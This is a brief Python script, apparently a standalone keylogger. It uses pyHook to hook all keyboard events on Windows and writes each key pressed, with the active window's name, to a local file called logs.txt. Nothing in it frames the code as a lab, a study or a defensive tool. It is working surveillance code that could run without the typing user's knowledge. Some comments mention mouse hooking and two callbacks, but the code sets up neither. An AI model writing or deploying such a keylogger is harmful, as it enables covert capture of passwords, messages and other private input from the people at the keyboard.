import pyHook
f=open('logs.txt','w+')
f.close()

def write_to_file(text):#this exists so that you can open and check the contents of the file anytime,even when the program is running.
    f=open('logs.txt','a+')
    f.write(text+'\n')
    f.close()

def OnKeyboardEvent(event):
    #registering the key and window names:
    key=event.Key  
    windowname=event.WindowName
    write_to_file(str(key+': '+'({})'.format(windowname)))
    return True

# create the hook mananger
hm = pyHook.HookManager()
# register two callbacks
hm.KeyDown = OnKeyboardEvent

# hook into the mouse and keyboard events

hm.HookKeyboard()

if __name__ == '__main__':
    import pythoncom
    pythoncom.PumpMessages()
